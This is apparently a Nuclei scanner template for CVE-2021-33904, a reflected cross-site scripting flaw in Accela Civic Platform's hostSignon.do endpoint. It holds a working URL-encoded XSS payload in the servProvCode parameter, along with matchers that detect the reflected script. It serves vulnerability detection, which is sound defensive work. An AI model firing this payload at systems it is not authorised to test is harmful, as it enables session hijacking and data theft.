id: CVE-2021-33904

info:
  name: Accela Civic Platform <=21.1 - Cross-Site Scripting
  author: geeknik
  severity: medium
  description: Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via the security/hostSignon.do parameter servProvCode.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to a patched version of Accela Civic Platform (version >21.1) that includes proper input validation to mitigate the XSS vulnerability.
  reference:
    - https://www.exploit-db.com/exploits/49980
    - https://gist.github.com/0xx7/3d934939d7122fe23db11bc48eda9d21
    - http://packetstormsecurity.com/files/163093/Accela-Civic-Platorm-21.1-Cross-Site-Scripting.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-33904
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-33904
    cwe-id: CWE-79
    epss-score: 0.12306
    epss-percentile: 0.9363
    cpe: cpe:2.3:a:accela:civic_platform:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: accela
    product: civic_platform
  tags: cve,cve2021,accela,xss,edb,packetstorm,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/security/hostSignon.do?hostSignOn=true&servProvCode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        words:
          - '"k3woq"^confirm(document.domain)^"a2pbrnzx5a9"'
          - 'servProvCode'
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022072b82a47f5de1079d7da007467c291bfda38cbf5ed3c4863a01f59fcd817229b02210082a7aa80e28c0580281803c51c2bf06449a7fadfd020fc76f45f5804cc2ff30e:922c64590222798bb761d5b6d8e72950